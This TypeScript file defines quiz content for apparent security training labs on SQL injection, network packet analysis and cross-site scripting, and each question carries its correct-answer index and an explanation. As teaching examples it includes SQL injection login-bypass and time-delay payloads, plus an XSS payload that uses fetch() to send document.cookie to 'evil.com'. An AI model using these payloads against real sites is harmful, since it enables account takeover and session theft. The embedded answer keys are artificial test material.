export interface LabQuestion {
  id: string;
  text: string;
  options: string[];
  correctAnswer: number; // 0-based index
  points: number;
  explanation: string;
}

export interface LabDefinition {
  id: string; // matches mockChallenges id
  title: string;
  category: string;
  difficulty: "Easy" | "Medium" | "Hard";
  estimatedTime: string;
  maxScore: number;
  objective: string;
  description: string;
  questions: LabQuestion[];
}

export const labDefinitions: LabDefinition[] = [
  {
    id: "c1",
    title: "SQL Injection Basics",
    category: "Web Security",
    difficulty: "Easy",
    estimatedTime: "20 min",
    maxScore: 100,
    objective:
      "Understand how SQL injection attacks work, identify vulnerable query patterns, and learn how to prevent them using parameterized queries.",
    description:
      "SQL injection is one of the most common and dangerous web vulnerabilities. In this lab you will analyze vulnerable code, identify injection points, and answer questions about real-world attack and defense techniques.",
    questions: [
      {
        id: "q1",
        text: "A login form uses this query: `SELECT * FROM users WHERE username='$user' AND password='$pass'`. Which input exploits it to log in as any user?",
        options: [
          "admin AND 1=1",
          "' OR '1'='1' --",
          "SELECT * FROM users",
          "DROP TABLE users",
        ],
        correctAnswer: 1,
        points: 20,
        explanation:
          "The payload `' OR '1'='1' --` closes the string, adds an always-true condition, and comments out the rest of the query — bypassing the password check entirely.",
      },
      {
        id: "q2",
        text: "What does the `--` sequence do in a SQL injection payload?",
        options: [
          "Marks the start of a subquery",
          "Encodes the payload in base64",
          "Comments out the remainder of the SQL statement",
          "Ends the database transaction",
        ],
        correctAnswer: 2,
        points: 20,
        explanation:
          "`--` is a SQL single-line comment delimiter. Everything after it is ignored by the database engine, letting attackers strip off legitimate conditions like AND password='…'.",
      },
      {
        id: "q3",
        text: "Which attack type extracts data by asking the database true/false questions without seeing any output?",
        options: [
          "Reflected XSS",
          "Error-Based SQL Injection",
          "Union-Based SQL Injection",
          "Blind SQL Injection",
        ],
        correctAnswer: 3,
        points: 20,
        explanation:
          "Blind SQL injection infers data from boolean responses or time delays when the application doesn't return query results directly.",
      },
      {
        id: "q4",
        text: "What is the MOST effective defense against SQL injection?",
        options: [
          "Blacklisting single-quote characters",
          "Using parameterized queries (prepared statements)",
          "Storing passwords in plain text",
          "Switching from MySQL to PostgreSQL",
        ],
        correctAnswer: 1,
        points: 20,
        explanation:
          "Parameterized queries separate SQL code from user data at the protocol level, making injection impossible regardless of what the user inputs.",
      },
      {
        id: "q5",
        text: "A tester enters `1' AND SLEEP(5) --` and the page takes 5 seconds to respond. What does this confirm?",
        options: [
          "The server is running slowly",
          "The database is PostgreSQL",
          "Time-based blind SQL injection is possible",
          "The input is properly sanitized",
        ],
        correctAnswer: 2,
        points: 20,
        explanation:
          "A delayed response proves the SLEEP() call executed, confirming the injection point. This is the hallmark of time-based blind SQL injection.",
      },
    ],
  },

  {
    id: "c2",
    title: "Network Packet Analysis",
    category: "Network Security",
    difficulty: "Medium",
    estimatedTime: "35 min",
    maxScore: 100,
    objective:
      "Analyze network packets using Wireshark concepts, identify suspicious traffic patterns, and understand TCP/IP fundamentals used in real-world security investigations.",
    description:
      "Network packet analysis is a core skill for security professionals. In this lab you will answer questions about Wireshark filters, TCP/IP protocols, traffic patterns, and how attackers and defenders use packet capture in practice.",
    questions: [
      {
        id: "q1",
        text: "During a Wireshark capture you see: SYN → SYN-ACK → ACK between two hosts. What is this sequence called?",
        options: [
          "Four-way termination handshake",
          "TCP three-way handshake",
          "UDP connection setup",
          "ARP resolution",
        ],
        correctAnswer: 1,
        points: 20,
        explanation:
          "SYN → SYN-ACK → ACK is the TCP three-way handshake that establishes a reliable connection before data transfer begins.",
      },
      {
        id: "q2",
        text: "Which Wireshark display filter shows only traffic to or from IP address 192.168.1.10?",
        options: [
          "host == 192.168.1.10",
          "ip.addr == 192.168.1.10",
          "src.ip = 192.168.1.10",
          "filter ip 192.168.1.10",
        ],
        correctAnswer: 1,
        points: 20,
        explanation:
          "`ip.addr == 192.168.1.10` matches packets where that IP appears as either source or destination — the standard Wireshark display filter syntax.",
      },
      {
        id: "q3",
        text: "An analyst sees hundreds of SYN packets from one IP to many destination ports, with no SYN-ACKs being responded to. What attack is most likely occurring?",
        options: [
          "ARP Poisoning",
          "DNS Amplification",
          "TCP SYN Port Scan",
          "ICMP Flood",
        ],
        correctAnswer: 2,
        points: 20,
        explanation:
          "Sending SYN packets across many ports without completing handshakes is a TCP SYN scan (e.g., Nmap -sS). It maps open ports without fully connecting.",
      },
      {
        id: "q4",
        text: "What does the TTL (Time To Live) field in an IP packet help detect?",
        options: [
          "Packet encryption strength",
          "Number of hops a packet has traveled and OS fingerprinting",
          "Bandwidth usage between hosts",
          "Application layer protocol type",
        ],
        correctAnswer: 1,
        points: 20,
        explanation:
          "TTL decrements by 1 at each hop. Analyzing initial TTL values (e.g., 64 for Linux, 128 for Windows) helps fingerprint operating systems and detect TTL manipulation attacks.",
      },
      {
        id: "q5",
        text: "You capture traffic and notice DNS queries going to an unusual external IP every 30 seconds, each with a long random subdomain. What threat does this suggest?",
        options: [
          "Normal DNS caching behavior",
          "DNS tunneling / command-and-control (C2) communication",
          "IPv6 transition mechanism",
          "DHCP lease renewal",
        ],
        correctAnswer: 1,
        points: 20,
        explanation:
          "Periodic DNS queries with random-looking subdomains are a classic indicator of DNS tunneling, used by malware to exfiltrate data or receive C2 commands over port 53.",
      },
    ],
  },

  {
    id: "c5",
    title: "Cross-Site Scripting (XSS)",
    category: "Web Security",
    difficulty: "Medium",
    estimatedTime: "30 min",
    maxScore: 100,
    objective:
      "Identify and differentiate XSS attack types, understand how payloads are injected and executed in browsers, and apply correct defenses including output encoding and CSP.",
    description:
      "Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. This lab covers reflected, stored, and DOM-based XSS, real attack payloads, and best-practice mitigations.",
    questions: [
      {
        id: "q1",
        text: "A search page reflects user input directly in the HTML: `<p>Results for: [input]</p>`. An attacker enters `<script>alert(1)</script>`. What type of XSS is this?",
        options: [
          "Stored XSS",
          "DOM-Based XSS",
          "Reflected XSS",
          "Blind XSS",
        ],
        correctAnswer: 2,
        points: 20,
        explanation:
          "Reflected XSS occurs when user input is immediately echoed back in the server response without sanitization. The payload is 'reflected' — it comes from the request itself.",
      },
      {
        id: "q2",
        text: "An attacker posts a comment containing `<img src=x onerror='fetch(\"https://evil.com/\"+document.cookie)'>` to a forum. Every visitor who loads the page is affected. What XSS type is this?",
        options: [
          "Reflected XSS",
          "Stored XSS",
          "CSRF",
          "Clickjacking",
        ],
        correctAnswer: 1,
        points: 20,
        explanation:
          "Stored (Persistent) XSS saves the payload in the database. It executes for every user who views the page — making it far more dangerous than reflected XSS.",
      },
      {
        id: "q3",
        text: "Which browser security header tells the browser to only execute scripts from approved sources, preventing most XSS attacks?",
        options: [
          "X-Frame-Options",
          "Strict-Transport-Security",
          "Content-Security-Policy (CSP)",
          "X-Content-Type-Options",
        ],
        correctAnswer: 2,
        points: 20,
        explanation:
          "Content-Security-Policy (CSP) lets servers define a whitelist of allowed script sources. A strict `script-src 'self'` policy blocks inline scripts and external origins injected by XSS.",
      },
      {
        id: "q4",
        text: "A developer sanitizes user input before saving to the database but forgets to encode it when rendering in HTML. Which XSS defense is missing?",
        options: [
          "Input validation on the client side",
          "Output encoding/escaping at render time",
          "CSRF token in every form",
          "SQL parameterized queries",
        ],
        correctAnswer: 1,
        points: 20,
        explanation:
          "Output encoding converts dangerous characters (like `<`, `>`, `&`) into safe HTML entities at render time. Input sanitization alone is insufficient — you must also encode output.",
      },
      {
        id: "q5",
        text: "JavaScript code reads `document.location.hash` and writes it to the DOM with `innerHTML`. No server is involved. What XSS type is this?",
        options: [
          "Reflected XSS",
          "Stored XSS",
          "DOM-Based XSS",
          "Second-Order XSS",
        ],
        correctAnswer: 2,
        points: 20,
        explanation:
          "DOM-Based XSS happens entirely in the browser — the payload is processed by client-side JavaScript reading unsafe sources (like `location.hash`) and writing to dangerous sinks (like `innerHTML`).",
      },
    ],
  },
];

export const FUNCTIONAL_LAB_IDS = labDefinitions.map((l) => l.id);

export function getLabDefinition(labId: string): LabDefinition | null {
  return labDefinitions.find((l) => l.id === labId) ?? null;
}
